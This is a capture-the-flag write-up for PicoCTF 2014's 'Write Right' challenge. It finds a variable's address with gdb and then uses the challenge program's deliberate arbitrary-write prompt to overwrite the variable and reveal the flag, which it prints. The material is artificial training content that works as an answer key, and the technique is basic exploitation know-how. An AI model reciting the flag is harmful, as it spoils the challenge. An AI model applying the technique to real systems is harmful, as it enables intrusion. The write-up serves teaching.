# Pico CTF 2014 : Write Right

**Category:** Binary Exploitation
**Points:** 50
**Description:**

>Can you change the secret? The binary can be found at /home/write_right/ on the shell server. The source can be found [here](write_right.c).

**Hint:**
>You will want to find the memory address of the secret.

## Write-up

True to the hint, we need to find the address of `secret`. We can do this using
gdb.
```
/home/write_right$ gdb -q ./write_right
Reading symbols from ./write_right...(no debugging symbols found)...done.
(gdb) info addr secret
Symbol "secret" is at 0x804a03c in a file compiled without debugging.
(gdb) quit
```
Now that we have found the address of `secret`, we need a value to fill it
with. From the source we see these lines:
```
if (secret == 0x1337beef){
    printf("Woah! You changed my secret!\n");
    printf("I guess this means you get a flag now...\n");
```

Now that we know what to change `secret` to.
```
/home/write_right$ ./write_right
Welcome! I will grant you one arbitrary write!
Where do you want to write to? 0x804a03c
Okay! What do you want to write there? 1337beef
Writing 0x1337beef to 0x804a03c...
Value written!
Woah! You changed my secret!
I guess this means you get a flag now...
arbitrary_write_is_always_right
```

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-write_right/>
